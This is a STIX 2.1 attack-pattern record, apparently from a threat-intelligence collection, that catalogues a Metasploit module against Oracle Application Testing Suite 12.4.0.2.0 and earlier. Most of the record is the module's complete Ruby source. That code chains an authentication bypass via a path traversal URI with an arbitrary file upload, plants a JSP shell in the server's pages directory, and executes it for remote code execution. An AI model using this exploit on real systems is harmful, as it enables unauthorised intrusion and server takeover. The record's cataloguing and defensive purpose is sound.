{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--54c84d4b-166b-447c-81b0-53ebe5dfd55d",
    "created": "2024-08-14T17:10:46.176384Z",
    "modified": "2024-08-14T17:10:46.176388Z",
    "name": "Oracle ATS Arbitrary File Upload",
    "description": " This module exploits an authentication bypass and arbitrary file upload in Oracle Application Testing Suite (OATS), version 12.4.0.2.0 and unknown earlier versions, to upload and execute a JSP shell. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/oracle_ats_file_upload.rb",
            "external_id": "oracle_ats_file_upload.rb"
        },
        {
            "source_name": "%w{CVE2016-0492}",
            "external_id": "#Authbypass"
        },
        {
            "source_name": "%w{CVE2016-0491}",
            "external_id": "#Fileupload"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Oracle ATS Arbitrary File Upload',\n      'Description'    => %q{\n        This module exploits an authentication bypass and arbitrary file upload\n        in Oracle Application Testing Suite (OATS), version 12.4.0.2.0 and\n        unknown earlier versions, to upload and execute a JSP shell.\n      },\n      'Author'         => [\n        'Zhou Yu', # Proof of concept\n        'wvu'      # Metasploit module\n      ],\n      'References'     => [\n        %w{CVE 2016-0492}, # Auth bypass\n        %w{CVE 2016-0491}, # File upload\n        %w{EDB 39691}      # PoC\n      ],\n      'DisclosureDate' => '2016-01-20',\n      'License'        => MSF_LICENSE,\n      'Platform'       => %w{win linux},\n      'Arch'           => ARCH_JAVA,\n      'Privileged'     => true,\n      'Targets'        => [\n        ['OATS <= 12.4.0.2.0 (Windows)', 'Platform' => 'win'],\n        ['OATS <= 12.4.0.2.0 (Linux)',   'Platform' => 'linux']\n      ],\n      'DefaultTarget'  => 0\n    ))\n\n    register_options([\n      Opt::RPORT(8088)\n    ])\n  end\n\n  def check\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri'    => '/admin/Login.do'\n    )\n\n    if res && res.body.include?('12.4.0.2.0')\n      CheckCode::Appears\n    else\n      CheckCode::Safe\n    end\n  end\n\n  def exploit\n    print_status(\"Uploading JSP shell to #{jsp_path}\")\n    upload_jsp_shell\n    print_status(\"Executing JSP shell: #{full_uri}olt/pages/#{jsp_filename}\")\n    exec_jsp_shell\n  end\n\n  def upload_jsp_shell\n    mime = Rex::MIME::Message.new\n    mime.add_part('.jsp', nil, nil, 'form-data; name=\"storage.extension\"')\n    mime.add_part(jsp_filename, nil, nil, 'form-data; name=\"fileName1\"')\n    mime.add_part('', nil, nil, 'form-data; name=\"fileName2\"') # Not needed\n    mime.add_part('', nil, nil, 'form-data; name=\"fileName3\"') # Not needed\n    mime.add_part('', nil, nil, 'form-data; name=\"fileName4\"') # Not needed\n    mime.add_part('*', nil, nil, 'form-data; name=\"fileType\"')\n    mime.add_part(payload.encoded, 'text/plain', nil,\n                  %Q{form-data; name=\"file1\"; filename=\"#{jsp_filename}\"})\n    mime.add_part('Default', nil, nil, 'form-data; name=\"storage.repository\"')\n    mime.add_part('.', nil, nil, 'form-data; name=\"storage.workspace\"')\n    mime.add_part(jsp_directory, nil, nil, 'form-data; name=\"directory\"')\n\n    register_file_for_cleanup(jsp_path)\n\n    send_request_cgi(\n      'method' => 'POST',\n      'uri'    => '/olt/Login.do/../../olt/UploadFileUpload.do',\n      'ctype'  => \"multipart/form-data; boundary=#{mime.bound}\",\n      'data'   => mime.to_s\n    )\n  end\n\n  def exec_jsp_shell\n    send_request_cgi(\n      'method' => 'GET',\n      'uri'    => \"/olt/pages/#{jsp_filename}\"\n    )\n  end\n\n  def jsp_directory\n    case target['Platform']\n    when 'win'\n      '..\\\\oats\\\\servers\\\\AdminServer\\\\tmp\\\\_WL_user\\\\oats_ee\\\\1ryhnd\\\\war\\\\pages'\n    when 'linux'\n      '../oats/servers/AdminServer/tmp/_WL_user/oats_ee/1ryhnd/war/pages'\n    end\n  end\n\n  def jsp_filename\n    @jsp_filename ||= Rex::Text.rand_text_alpha(8) + '.jsp'\n  end\n\n  def jsp_path\n    jsp_directory + \"#{target['Platform'] == 'win' ? '\\\\' : '/'}\" + jsp_filename\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-01-20",
    "x_mitre_platforms": [
        "%w{win linux}"
    ]
}